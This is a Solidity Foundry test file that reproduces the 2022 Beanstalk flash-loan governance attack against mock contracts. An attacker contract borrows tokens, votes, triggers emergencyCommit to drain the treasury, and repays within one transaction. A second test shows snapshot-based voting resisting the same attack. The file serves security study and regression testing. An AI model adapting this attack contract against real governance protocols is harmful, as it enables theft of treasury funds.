// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {Silo, IERC20} from "../src/beanstalk/Silo.sol";
import {GovernanceBase, VulnerableGovernance, SafeGovernance} from "../src/beanstalk/Governance.sol";

/// PoC for the Beanstalk governance flash-loan attack (2022-04-17, ~$181M).
///   forge test --match-contract BeanstalkGovernance -vvv
///
/// Invariant that SHOULD hold (master-checklist SC02-GOV-1):
///   a proposal's approval must reflect long-term stakeholders' voting power AT
///   PROPOSAL CREATION — voting power acquired within a single block (flash loan)
///   must not be able to swing it.
/// The attack breaks it: zero-capital flash loan -> supermajority -> emergencyCommit
/// -> the whole treasury is drained in one atomic transaction.
///
/// See docs/exploits/beanstalk-governance-flashloan-2022-04-17.md

/// Lends `amount` for the duration of one call and demands it back in the same tx.
contract FlashLender {
    IERC20 public immutable token;

    constructor(IERC20 _token) {
        token = _token;
    }

    function flashLoan(uint256 amount, GovAttacker borrower, uint256 bip) external {
        token.transfer(address(borrower), amount);
        borrower.onFlashLoan(amount, bip);
        require(token.transferFrom(address(borrower), address(this), amount), "not repaid");
    }
}

/// Orchestrates deposit -> vote -> emergencyCommit -> withdraw -> repay, all inside the
/// flash-loan callback, with zero starting capital.
contract GovAttacker {
    Silo public immutable silo;
    GovernanceBase public immutable gov;
    IERC20 public immutable token;
    FlashLender public immutable lender;

    constructor(Silo _silo, GovernanceBase _gov, FlashLender _lender) {
        silo = _silo;
        gov = _gov;
        lender = _lender;
        token = _silo.asset();
    }

    function attack(uint256 amount, uint256 bip) external {
        lender.flashLoan(amount, this, bip);
    }

    function onFlashLoan(uint256 amount, uint256 bip) external {
        require(msg.sender == address(lender), "only lender");
        token.approve(address(silo), amount);
        silo.deposit(amount); // mint an overwhelming pile of Roots this block
        gov.vote(bip);
        gov.emergencyCommit(bip); // treasury drains to this contract
        silo.withdrawAll(); // unwind the deposit
        token.approve(address(lender), amount); // allow repayment
    }
}

contract BeanstalkGovernanceTest is Test {
    MockERC20 token;
    Silo silo;
    FlashLender lender;

    address honest = makeAddr("honestStaker");
    address attackerEOA = makeAddr("attacker");

    uint256 constant TREASURY = 1_000_000e18; // all protocol assets
    uint256 constant HONEST_STAKE = 100e18; // long-term stakeholders' Roots
    uint256 constant FLASH_AMOUNT = 10_000e18; // flash-loaned voting power

    function setUp() public {
        token = new MockERC20();
        silo = new Silo(IERC20(address(token)));
        lender = new FlashLender(IERC20(address(token)));

        // Long-term staker establishes the legitimate Roots base.
        token.mint(honest, HONEST_STAKE);
        vm.startPrank(honest);
        token.approve(address(silo), type(uint256).max);
        silo.deposit(HONEST_STAKE);
        vm.stopPrank();

        // Flash-loan liquidity.
        token.mint(address(lender), FLASH_AMOUNT);
    }

    function _fundTreasury(address gov) internal {
        token.mint(gov, TREASURY);
    }

    function test_vulnerableGovernance_isDrained() public {
        VulnerableGovernance gov = new VulnerableGovernance(silo);
        _fundTreasury(address(gov));
        GovAttacker attacker = new GovAttacker(silo, gov, lender);

        // Attacker pre-submits the malicious proposal (~24h ahead), beneficiary = self.
        vm.prank(attackerEOA);
        uint256 bip = gov.propose(address(attacker));

        // The 1-day emergency delay elapses — but it provides no protection because the
        // proposal was pre-submitted and the whole attack lands in one block.
        vm.warp(block.timestamp + gov.EMERGENCY_PERIOD() + 1);

        assertEq(token.balanceOf(address(gov)), TREASURY, "treasury full pre-attack");

        attacker.attack(FLASH_AMOUNT, bip);

        // Voting power was read in real time: ~99% of Roots were flash-loaned.
        uint256 attackerProfit = token.balanceOf(address(attacker));
        console2.log("attacker profit (treasury drained):", attackerProfit / 1e18);
        assertEq(attackerProfit, TREASURY, "attacker drained the entire treasury");
        assertEq(token.balanceOf(address(gov)), 0, "treasury emptied");
    }

    function test_safeGovernance_resistsAttack() public {
        SafeGovernance gov = new SafeGovernance(silo);
        _fundTreasury(address(gov));
        GovAttacker attacker = new GovAttacker(silo, gov, lender);

        vm.prank(attackerEOA);
        uint256 bip = gov.propose(address(attacker));

        vm.warp(block.timestamp + gov.EMERGENCY_PERIOD() + 1);

        // Snapshot voting power: the attacker held 0 Roots when the proposal was
        // created, so its flash-loaned Roots count for nothing -> no supermajority.
        vm.expectRevert(bytes("no supermajority"));
        attacker.attack(FLASH_AMOUNT, bip);

        assertEq(token.balanceOf(address(gov)), TREASURY, "treasury untouched");
        assertEq(token.balanceOf(address(attacker)), 0, "attacker gained nothing");
    }
}
